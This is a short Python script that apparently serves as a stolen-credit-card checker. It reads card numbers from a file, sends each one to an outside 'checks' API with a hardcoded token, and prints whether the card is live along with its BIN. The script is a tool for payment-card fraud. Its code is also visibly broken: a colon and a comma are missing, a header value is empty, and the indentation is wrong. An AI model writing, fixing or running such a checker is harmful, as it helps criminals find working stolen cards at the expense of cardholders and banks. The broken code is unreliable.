import requests
import json

token = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjp7Il9pZCI6IjY2MzgwOTJmM2MwZWExMWUxZGRiNjE3ZiJ9LCJpYXQiOjE3MTQ5NDg0MDB9.55WXKpaoVEYunLRah6YFkVozAHksbXjCv9Zpi7hhImo'

def check(cc)
r = requests.post(
  "https://bteck.tech/api/checks",
  data= '{"cc": "%s"}' % cc
  headers={
  "Content-Type": "application/json",
  "token":
}
)

response = r.text
response = json.loads(response)

return response

def check_list():
  ccs_list = open('ccs.txt', 'r').readlines()
  for cc in ccs_list:
    cc = str(cc).rstrip()

checked = check(cc)
bin = checked["bin"]
live_or_die = checked["return"]

# show result

print("%s - %s - %s" % (live_or_die, cc, bin))

#run
check_list()
  
